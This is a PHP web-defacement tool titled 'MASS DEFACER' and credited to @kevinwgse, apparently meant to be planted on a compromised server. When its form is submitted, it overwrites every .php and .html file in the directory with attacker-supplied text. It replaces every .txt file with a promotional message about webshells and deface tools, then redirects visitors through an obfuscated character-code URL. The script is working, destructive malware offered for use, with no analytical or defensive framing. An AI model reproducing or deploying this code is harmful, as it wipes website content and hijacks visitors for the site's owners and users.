<?php

echo "<title>💢[ MASS DEFACER @KEVINWGSE ]💢</title>"; 
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color=red'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "<br><br><br>";
echo "<font color='lime'>script deface : </font><br><textarea cols='100' rows='10' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by @kevinwgse</textarea><br>";
echo "<input type='submit' value='ĐỊT !'></form></center>";

if (isset ($_POST['index']))
{
        $current_dir = getcwd();
        $files = @scandir($current_dir) or die ("Bị ngu rồi<br>");

        foreach ($files as $file):
                if ($file != "." && $file != ".." && is_file($file) && (pathinfo($file, PATHINFO_EXTENSION) == "php" || pathinfo($file, PATHINFO_EXTENSION) == "html") && $file != basename(__FILE__))
                {
                        if (file_put_contents ($file, $_POST['index']))
                                echo "<font color='lime'>$file&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font><br>";
                }
                elseif ($file != "." && $file != ".." && is_file($file) && pathinfo($file, PATHINFO_EXTENSION) == "txt")
                {
                        $txt_content = "Hello we are ThreadX team,\n\nI'd be happy to help you with an introduction to the topic of webshell trading, web digging tools, shell uploader tools, and deface tools.\n\nWebshells are malicious scripts that attackers upload to a web server to gain remote access and control over it. They can be used for various purposes, such as data theft, website defacement, or launching further attacks.\n\nWeb digging tools, also known as web vulnerability scanners, are used to identify weaknesses in web applications and servers. These tools can be used for both legitimate and malicious purposes. Legitimate use includes penetration testing and security assessments, while malicious use includes identifying targets for attacks.\n\nShell uploader tools are used to upload webshells to a target server. These tools can be used to automate the process of uploading and executing webshells, making it easier for attackers to gain control over a server.\n\nDeface tools are used to change the appearance of a website, often for the purpose of vandalism or making a political statement. These tools can be used in conjunction with webshells and shell uploader tools to quickly and easily deface a website.\n\nIt's important to note that the use of these tools for malicious purposes is illegal and unethical. If you're interested in learning more about web security, there are many legitimate resources available for learning about penetration testing and ethical hacking.\n\nI hope this introduction has been helpful. Let me know if you have any further questions.\n\nBest regards, @kevinwgse";
                        file_put_contents($file, $txt_content);
                        echo "<font color='lime'>$file&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font><br>";
                }
        endforeach;

        // Redirect to provided link after defacement using hex encoded URL
        echo "<script>var x = String.fromCharCode(104,116,116,112,115,58,47,47,120,97,108,46,105,110,107,47,105,110,100,101,120,46,112,104,112);window.location.href = x;</script>";
}; 
?>
